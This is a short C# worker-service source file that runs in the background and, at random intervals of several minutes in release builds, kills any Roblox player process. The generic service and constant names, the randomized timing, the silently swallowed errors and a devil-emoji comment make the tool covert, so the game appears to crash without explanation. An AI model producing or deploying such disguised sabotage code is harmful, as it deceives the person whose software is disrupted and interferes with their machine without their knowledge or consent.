using Microsoft.Extensions.Hosting;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace InnovativeWorkerService;

public class Worker : BackgroundService
{

#if DEBUG
    private const int BOTTOM_BORDER_MIN = 0;
    private const int TOP_BORDER_MIN = 1;
#else
    private const int BOTTOM_BORDER_MIN = 5;
    private const int TOP_BORDER_MIN = 12;
#endif

    private const string PROCESS_PALETTE = "(?i)^(robloxplayer).*";
    private readonly Random random = new Random();

    public Worker()
    {
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        while (!stoppingToken.IsCancellationRequested)
        {
            float mins = random.Next(BOTTOM_BORDER_MIN, TOP_BORDER_MIN) + random.NextSingle();
            TimeSpan delay = TimeSpan.FromMinutes(mins);
            await Task.Delay(delay, stoppingToken);
            try
            {
                List<Process> processes = new(Process.GetProcesses());
                foreach (var process in processes)
                {
                    var m = Regex.Match(process.ProcessName, PROCESS_PALETTE);
                    if (m.Success)
                    {
                        // 😈
                        process.Kill(true);
                    }
                }
            }
            catch
            {
            }
        }
    }
}